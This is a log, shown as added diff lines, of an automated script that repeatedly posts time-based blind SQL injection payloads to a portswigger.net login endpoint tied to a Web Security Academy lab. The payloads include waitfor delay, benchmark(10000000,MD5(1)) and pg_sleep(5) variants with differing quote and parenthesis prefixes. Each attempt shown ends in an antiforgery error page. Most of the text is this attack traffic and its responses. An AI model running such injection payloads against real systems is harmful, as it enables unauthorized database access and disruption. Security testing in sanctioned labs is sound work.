+2024-08-16 22:04:21,534 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:23,084 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:23,640 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:23,654 - INFO - [22:04:23] Payload testing: ");waitfor delay '0:0:5'--
+2024-08-16 22:04:23,662 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:25,344 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:25,909 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:25,993 - INFO - [22:04:25] Payload testing: ");waitfor delay '0:0:5'--
+2024-08-16 22:04:26,010 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:27,585 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:28,147 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:28,166 - INFO - [22:04:28] Payload testing: ");waitfor delay '0:0:5'--
+2024-08-16 22:04:28,176 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:29,825 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:30,453 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:30,468 - INFO - [22:04:30] Payload testing: ));waitfor delay '0:0:5'--
+2024-08-16 22:04:30,478 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:32,374 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:33,024 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:33,050 - INFO - [22:04:33] Payload testing: ));waitfor delay '0:0:5'--
+2024-08-16 22:04:33,061 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:34,698 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:35,296 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:35,305 - INFO - [22:04:35] Payload testing: ));waitfor delay '0:0:5'--
+2024-08-16 22:04:35,318 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:36,941 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:37,284 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:37,576 - INFO - [22:04:37] Payload testing: '));waitfor delay '0:0:5'--
+2024-08-16 22:04:37,583 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:39,233 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:39,857 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:39,869 - INFO - [22:04:39] Payload testing: '));waitfor delay '0:0:5'--
+2024-08-16 22:04:39,876 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:41,544 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:42,163 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:42,182 - INFO - [22:04:42] Payload testing: '));waitfor delay '0:0:5'--
+2024-08-16 22:04:42,193 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:43,756 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:44,098 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:44,357 - INFO - [22:04:44] Payload testing: "));waitfor delay '0:0:5'--
+2024-08-16 22:04:44,365 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:46,112 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:46,704 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:46,718 - INFO - [22:04:46] Payload testing: "));waitfor delay '0:0:5'--
+2024-08-16 22:04:46,726 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:48,359 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:48,910 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:48,936 - INFO - [22:04:48] Payload testing: "));waitfor delay '0:0:5'--
+2024-08-16 22:04:48,943 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:50,599 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:50,923 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:51,188 - INFO - [22:04:51] Payload testing: benchmark(10000000,MD5(1))#
+2024-08-16 22:04:51,198 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:52,905 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:53,535 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:53,547 - INFO - [22:04:53] Payload testing: benchmark(10000000,MD5(1))#
+2024-08-16 22:04:53,554 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:55,111 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:55,703 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:55,712 - INFO - [22:04:55] Payload testing: benchmark(10000000,MD5(1))#
+2024-08-16 22:04:55,724 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:57,331 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:57,639 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:04:57,918 - INFO - [22:04:57] Payload testing: 1 or benchmark(10000000,MD5(1))#
+2024-08-16 22:04:57,927 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:04:59,592 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:04:59,920 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:00,199 - INFO - [22:05:00] Payload testing: 1 or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:00,206 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:01,875 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:02,517 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:02,530 - INFO - [22:05:02] Payload testing: 1 or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:02,542 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:04,113 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:04,711 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:04,740 - INFO - [22:05:04] Payload testing: " or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:04,749 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:06,272 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:06,826 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:06,848 - INFO - [22:05:06] Payload testing: " or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:06,857 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:08,544 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:09,163 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:09,186 - INFO - [22:05:09] Payload testing: " or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:09,195 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:10,887 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:11,515 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:11,533 - INFO - [22:05:11] Payload testing: ' or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:11,543 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:13,384 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:14,001 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:14,017 - INFO - [22:05:14] Payload testing: ' or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:14,029 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:15,921 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:16,538 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:16,559 - INFO - [22:05:16] Payload testing: ' or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:16,570 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:18,240 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:18,801 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:18,812 - INFO - [22:05:18] Payload testing: 1) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:18,836 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:20,474 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:21,027 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:21,052 - INFO - [22:05:21] Payload testing: 1) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:21,062 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:22,736 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:23,329 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:23,356 - INFO - [22:05:23] Payload testing: 1) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:23,364 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:25,046 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:25,663 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:25,686 - INFO - [22:05:25] Payload testing: ") or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:25,701 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:27,354 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:27,933 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:27,951 - INFO - [22:05:27] Payload testing: ") or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:27,966 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:29,665 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:30,289 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:30,342 - INFO - [22:05:30] Payload testing: ") or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:30,351 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:31,983 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:32,317 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:32,602 - INFO - [22:05:32] Payload testing: ') or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:32,616 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:34,267 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:34,612 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:34,903 - INFO - [22:05:34] Payload testing: ') or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:34,912 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:36,680 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:37,293 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:37,306 - INFO - [22:05:37] Payload testing: ') or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:37,313 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:38,890 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:39,473 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:39,540 - INFO - [22:05:39] Payload testing: 1)) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:39,550 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:41,256 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:41,660 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:41,954 - INFO - [22:05:41] Payload testing: 1)) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:41,966 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:43,693 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:44,017 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:44,283 - INFO - [22:05:44] Payload testing: 1)) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:44,302 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:46,039 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:46,638 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:46,657 - INFO - [22:05:46] Payload testing: ")) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:46,664 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:48,255 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:48,812 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:48,832 - INFO - [22:05:48] Payload testing: ")) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:48,843 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:50,513 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:50,869 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:51,168 - INFO - [22:05:51] Payload testing: ")) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:51,179 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:52,859 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:53,541 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:53,637 - INFO - [22:05:53] Payload testing: ')) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:53,649 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:55,317 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:55,878 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:55,905 - INFO - [22:05:55] Payload testing: ')) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:55,915 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:57,576 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:05:58,197 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:05:58,212 - INFO - [22:05:58] Payload testing: ')) or benchmark(10000000,MD5(1))#
+2024-08-16 22:05:58,224 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:05:59,935 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:00,556 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:00,584 - INFO - [22:06:00] Payload testing: pg_sleep(5)--
+2024-08-16 22:06:00,599 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:02,340 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:02,955 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:02,972 - INFO - [22:06:02] Payload testing: pg_sleep(5)--
+2024-08-16 22:06:02,984 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:04,742 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:05,286 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:05,300 - INFO - [22:06:05] Payload testing: pg_sleep(5)--
+2024-08-16 22:06:05,312 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:07,037 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:07,650 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:07,678 - INFO - [22:06:07] Payload testing: 1 or pg_sleep(5)--
+2024-08-16 22:06:07,690 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:09,564 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:10,137 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
